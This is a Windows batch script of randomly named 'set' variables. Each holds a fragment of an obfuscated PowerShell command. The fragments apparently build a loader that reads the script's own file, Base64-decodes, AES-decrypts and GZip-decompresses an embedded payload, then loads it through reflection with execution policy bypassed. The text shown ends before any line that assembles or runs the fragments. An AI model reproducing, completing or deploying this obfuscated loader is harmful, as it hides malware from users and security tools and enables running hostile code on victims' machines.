@echo off
set "tCUzSnvjKk=rtS4"
set "BjERyxinbo=RmAx"
set "uydZkgAaAm='0Pg"
set "cTeibQwmiz=gjYA"
set "OwRnSICuMg=join"
set "OHJFRqkLis=gsYZ"
set "iHOAoWYPtc=)($q"
set "DljGOBEHlr=oin "
set "QsXoBlogxF=fwBO"
set "yrQcyomIwr=]::("
set "rsWepKObNM=oryS"
set "cNastcJhCn='[-1"
set "pTyXgiHFja=ecry"
set "VenrRRIxPy=eMVs"
set "HKrYOFgYwT=ptog"
set "gwKfVIgZRh=Secu"
set "ZyWMAEQNwu=ment"
set "RBgPqUCwDQ=);$V"
set "MCveGAeJnY=pose"
set "VIyRqOJfiC=sPca"
set "jVjXoFsVAK=eam("
set "VGsvelqrze=y.Cr"
set "hOjZXhEjmu=fore"
set "nZIYtaQsRB=e]::"
set "VeuEeBnemf=embl"
set "aZHQQtGRZt=7;$e"
set "QyzovCmmOX=y.Pa"
set "PTKcIwVzYK=le  "
set "UwbdkYsffy=l5E7"
set "qHOxQdxGsG=Conv"
set "byyRgYYXVE=..-1"
set "mjNwdjRjmn=ispo"
set "pmeUUESDVj=[-1."
set "wZSZtaXLQJ=morF"
set "lCyzzLTyjr=, $q"
set "XDopZIgGpq=1..-"
set "WwVosUOcbJ=yste"
set "fZvtNLsgUo=1] -"
set "TbYxdzdkGF=bypa"
set "mcSKETQAJa=ing("
set "vDsdLTwvBf=rt]:"
set "FzfEfLiWod=.Sec"
set "IYPEblwCXJ=stem"
set "qORZWokcvM=Invo"
set "KcFZzXDgJp=OBE."
set "xcqOzmtPsW=yTo("
set "JqCDMzqnjD=OBE "
set "ypHneRvxHY=ptog"
set "IxRktsQKaX=gUQ "
set "EbwDWYBFun=[Env"
set "SQUDEnOhwP=.Key"
set "uZtycyHTay=Syst"
set "kLQnTAMaCY=k; }"
set "YZtfeHUzTz=am;$"
set "DquuzjKNam=raph"
set "xclbSHWHxA=L4Yi"
set "bTXtabvoIY=)))"
set "PyiSSPfIuX=).Sp"
set "jmlvIfwxfu= = $"
set "oYmOgrgXfZ=16] "
set "CTsTAuHuXn=($iK"
set "NbBaSDJmJP=BC;$"
set "OWySkcZGkc=ose("
set "zoazYJIBll=New-"
set "AzsShTjnmd=TllA"
set "JxfrAAXBrp=)) {"
set "TgkOtebYql=-Obj"
set "PvRSNirFZV=th('"
set "kxaBbuEaoH=O.Pa"
set "JhmXwtOicU=e = "
set "YHZzkJSeqW=ap, "
set "SlISfnzIkm=.Mem"
set "BwlKcPBfki=.GZi"
set "OgRdFJjhtI=mory"
set "ICIQPuaNyk=.IO."
set "nkTQiPWoNl=iron"
set "kZEFJzGuPa=.Cry"
set "gUOPmOFprV=a = "
set "yhjBoQprOk=urit"
set "wMvRmWeRzJ=m.IO"
set "ZZPyfSQjiu= New"
set "mLgQUjXdMg=bstr"
set "xGVTIgPIWA=:: '"
set "sxAliXMIlk=.Cry"
set "dsQGCdcGTm=kalO"
set "vqQohpUXCh=[]] "
set "rPKNuiVXsi=('%~f0'"
set "lSlYFLhHfy=s75K"
set "zwisErgIkW=::De"
set "joFFuVEkqG=nirt"
set "uxZtWNsDxN=stem"
set "TiqxOratDo=lBlo"
set "VmDdKFoKuA=ct S"
set "pTdjBOfZoF=raph"
set "AEMXwKixBz=a, 0"
set "QNYWqaSPrI=lit("
set "jualMuLVpF=-nop"
set "GVhYLVjKXN=:('g"
set "OrtSXAkPbV=ach "
set "dABfYAnQcR= [Sy"
set "nlYNBDwtxd=YxVw"
set "LIZVrMdAbx=($iK"
set "mCIcmgXMJP=orF'"
set "wZABLqWueU=Mode"
set "KsOZMwaSCV=[Sys"
set "mCcBAfRGvx=$Fjg"
set "OTPbcVXUHG=qsPc"
set "DEKgRFmNit=E.Su"
set "ddhPKxPPfx=k) {"
set "MyKLxfNgXL=n ''"
set "KreUygyGPE=$qrc"
set "vcyXYDYnxX=fwBO"
set "OJCgWKqvym=saBm"
set "NRBDegIrGF=oL'["
set "VoaKAzMNzF=tem."
set "oSWZHPNLYY=New-"
set "lPoKJhPCug=iKOB"
set "MjfdIkLnoq=tsWi"
set "dDcfIgeKdr=ne);"
set "UjBRivLeRd=tem."
set "lbcEdBYSwd=S46e"
set "hbtfXfhEBP=CFxo"
set "ZSjMQwbGkT=BO.I"
set "rLRoXPskVb=3); "
set "tuujluUwZU=Pw.T"
set "UZATXKvgmv=..-1"
set "MdzwgJiLfj=ddin"
set "wOXTCnuhnt=);$H"
set "YPYkbRUzGT=rity"
set "OkTpoLNdie=m(, "
set "tBlCHetylI=Q.En"
set "CpUpiXPkEu=zZ.T"
set "gBsYZzJxQA=brea"
set "hdeHSExsUN=gap."
set "LobfjuxAJh=ddin"
set "xUMQTcpTpb=.Com"
set "AMjgDjOaBI=;$yp"
set "pfAishbFxE=-joi"
set "cRdsCvTVrX=[Sys"
set "wfeCDDXXva=rity"
set "TyVpQlVcNJ=form"
set "ZJXcdKXghO=tem."
set "ZtzWMLhHXU=tS46"
set "WjkglaanPF=;$Fj"
set "SDkYasczCv=Comp"
set "ERFLJxDgnj=stem"
set "PTpxNwbVqw=.Con"
set "GokKvicZWH=ose("
set "CvkKVtGser=Stre"
set "drIXmuxlWy= [Sy"
set "jEuGfKGuuE=);$q"
set "bKVtMMkjii=in $"
set "FiMeuIsZrW=] -j"
set "OwROPOzXPA=.Cre"
set "QMhKZKKTKe=$qsP"
set "mokgCmzINe=zZ);"
set "LXntEoQfNw=PxEW"
set "QrdrRaMKKB===')"
set "hrrgTiFdgG='[-1"
set "GrwvbyekyF=vert"
set "ksKjQFUDvx=ca ="
set "PLehcBURSe=; };"
set "zHIIOYXhwp=m.IO"
set "JBoLgTjNuH=File"
set "DEiPpqMFsA=daeR"
set "ubqXweVVDD=.Mod"
set "GtneeyLrqa=flec"
set "FkENVZtoTT=$qrc"
set "MmbtfIetYn=Qk ="
set "bDgYfZBBID=PTtG"
set "iAbZmMzEDR=Fina"
set "AwagNFJKfe=.Len"
set "wwRIpccgLZ=gMod"
set "HKLpVwvPbe=g = "
set "FirCItAQDN=, (,"
set "TjoAKThEtd=-1.."
set "qgjeDPoBqa=);$e"
set "OSidEGmnwx=[IO."
set "ofgGbfgrJr= '')"
set "wZnbfzyaWS= [st"
set "pmKxBxdobn=ay()"
set "zSJpMGQDsx=qsPc"
set "KoWelGFozb=yste"
set "OkXcuLCFOF=Syst"
set "aNyXVzMLGF=Secu"
set "ttHIWrWdXv=6esa"
set "RNAopVoOdM='')("
set "YsExvElQTM=ew-O"
set "NltPwiilYY=join"
set "ZYlrixnhfC=efwB"
set "oznhKFTiOA=ewLi"
set "tLSthLhTUS=$Ugw"
set "wTaIlKExtm=F'[-"
set "NUowjsGtKS=n ''"
set "zgBPJNvAcf=fwBO"
set "xhFjkRuAdi=m.Re"
set "kSPSBYkaOF=Disp"
set "zBohRjyuPb=Hkal"
set "qpyvKQAeqn=em.I"
set "JmnemSHuqx=p = "
set "LuUxCyHmBT=)($z"
set "vQxkWtgNXs=esMa"
set "xOJRTgSeww=y.Ci"
set "qgOlKMVrNl=dj0C"
set "udrNGspAsm= = $"
set "odskPXWbXQ=.Dis"
set "oKybPeMklp=ptor"
set "VfNMNYgJAT=hy.A"
set "nyWlzsNZzt=]::("
set "GsLIKEXFCP=O = "
set "OQSMjbkZSO=-4] "
set "nukErazaLi=sPca"
set "QQrUqQzJwb=;$Xe"
set "vSCRpiQMQN=sion"
set "FiIKlzQYnQ=PKCS"
set "bMqtYBOopk=grap"
set "xccoibroJF=d;$e"
set "cOplHkckjP='gni"
set "sVApcrnZrg==');"
set "PZzjRlEmwQ=.Dis"
